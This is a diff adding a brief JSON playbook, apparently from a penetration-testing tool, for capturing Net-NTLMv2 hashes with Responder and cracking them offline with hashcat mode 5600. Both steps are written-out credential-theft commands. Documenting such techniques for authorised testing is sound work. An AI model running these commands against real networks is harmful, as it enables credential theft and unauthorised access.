@@ -1,0 +1,19 @@
+{
+	"name": "Net-NTLMv2 Hash Cracking",
+	"description": "Crack challenge-response hashes from network auth.",
+	"tools": [],
+	"steps": [
+		{
+			"index": 1,
+			"name": "Capture with Responder",
+			"command": "responder -I eth0",
+			"description": "Poison and capture."
+		},
+		{
+			"index": 2,
+			"name": "Hashcat Mode 5600",
+			"command": "hashcat -m 5600 netntlmv2.txt wordlist.txt",
+			"description": "Offline crack."
+		}
+	]
+}
